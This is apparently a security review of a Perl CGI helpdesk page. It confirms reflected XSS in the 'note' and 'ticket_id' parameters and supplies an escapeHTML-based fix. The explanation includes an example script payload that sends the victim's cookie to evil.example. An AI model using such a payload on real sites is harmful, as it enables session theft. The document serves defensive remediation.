## Verdict

Confirmed. `$cgi->param('note')` is attacker-controlled request data that is concatenated directly into the HTML response with no encoding, allowing reflected cross-site scripting. The adjacent `ticket_id` output on line 14 has the identical flaw and is fixed alongside it.

## Source

`$cgi->param('note')` (line 18) and `$cgi->param('ticket_id')` (line 10, output at line 14) — both read directly from the incoming CGI request with no validation or encoding applied before being written to the response body.

## Fix

```perl
#!/usr/bin/perl
use strict;
use warnings;
use CGI;

# Helpdesk ticket lookup page: renders the ticket ID and an optional
# customer-supplied note back onto the confirmation screen.

my $cgi = CGI->new;
my $ticket_id = $cgi->param('ticket_id');

print $cgi->header;
print "<html><head><title>Ticket Lookup</title></head><body>\n";
print "<h2>Ticket #" . $cgi->escapeHTML($ticket_id) . "</h2>\n";
print "<p>Status: Open</p>\n";

print "<p>Customer note: " . $cgi->escapeHTML($cgi->param('note')) . "</p>\n";

print "</body></html>\n";
```

## Explanation

`CGI.pm`'s `param()` returns the raw, unescaped value submitted by the client with no HTML-entity encoding of its own, so any `<`, `>`, `"`, or `&` characters pass through unchanged into the response markup. Because `note` and `ticket_id` are written straight into an HTML context via string concatenation, a request such as `note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` is echoed back verbatim and executed in the victim's browser as reflected XSS — the same applies to `ticket_id` since it is a query parameter, not a value derived from a trusted lookup.

The fix wraps both values in `$cgi->escapeHTML()`, CGI.pm's built-in encoder, which converts `&`, `<`, `>`, `"`, and `'` into their corresponding HTML entities before concatenation. This neutralizes markup and script delimiters while leaving the visible text intact, so the browser renders the note and ticket ID as inert text rather than parsing them as HTML/JS. Encoding is applied at the point of output (the sink) rather than at input, which is correct here since the values are used only in an HTML body context — encoding at the sink also avoids double-encoding issues if the same parameter were later reused in a different context (e.g. a URL or JSON body) where a different escaping rule would apply. No output-context change (e.g. writing into an attribute or `<script>` block) was introduced, so `escapeHTML()` alone is sufficient; had either value been placed inside an HTML attribute, a `<script>` block, or a URL, a context-specific encoder would be required instead.
